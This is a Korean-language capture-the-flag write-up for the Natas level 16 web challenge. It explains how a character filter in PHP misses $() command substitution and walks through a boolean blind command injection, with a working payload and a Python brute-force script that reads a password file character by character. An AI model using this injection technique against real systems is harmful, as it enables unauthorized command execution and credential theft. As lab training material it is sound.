# Category

web

# Overview

For security reasons, we now filter even more on certain characters

Find words containing:

# Analysis

입력된 데이터 검증이 `preg_match('/[;|&`\'"]/',$key)` 정규표현식으로 파이프라인을 이용한 command injection을 막기 위한 처리가 되어있다.

정규표현식에 `$()`와 같이 명령문 안에서 다른 명령문를 실행할 수 있는 표현은 처리가 되어있지않아 `$()`를 이용하여 명령어를 실행할 경우 의도하지 않은 명령을 실행시킬 수 있다.

비밀번호가 있는 파일인 `/etc/natas_webpass/natas17`에서 `grep`을 활용해 비밀번호와 일치하는 글자를 한 글자씩 가져와 맞춰보면서 boolean based blind injection 공격이 가능하다.

# Exploitation

`grep -i $(grep ^[a-zA-Z0-9] /etc/natas_webpass/natas17) dictionary.txt`와 같이 내부에 또다른 명령문 `$()` 이용하여 비밀번호를 한 자리씩 맞춰가며 총 32자리가 될때까지 맞춰나간다면 전체 비밀번호를 찾을 수 있다.

`$(grep ^[a-zA-Z0-9] /etc/natas_webpass/natas17)`인 내부 명령어실행 결과가 비밀번호와 일치한다면 전체 비밀번호를 가져오며 괄호 밖 명령어가 실행되는 `grep -i "<PASSWORD>" dictionary.txt`에는 전체 비밀번호와 같은 내용이 없기 때문에 결과적으로 빈 값을 가져오게된다.

반면 비밀번호와 일치하는 문자가 없다면 내부적으로는 빈 값을 리턴해 괄호 밖 명령어에서 `grep -i "" dictionary.txt`와 같이 모든 값을 가져오게 되며, 두 가지의 반응을 통해 요청한 값이 정답 여부를 판별할 수 있다.

```py
# solve.py

def main():
    NOT_SEARCHED_LENGTH = 481
    candidate = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    answer = ""
    # 비밀번호 자리수 만큼 반복
    for _ in range(32):
        for c in candidate:
            print(answer + c)
            cmd = f"$(grep ^{answer + c} /etc/natas_webpass/natas17)"
            text = request(cmd)
            if len(text) <= NOT_SEARCHED_LENGTH:
                answer += c
                break

```

# Flag

`Eq...OC`
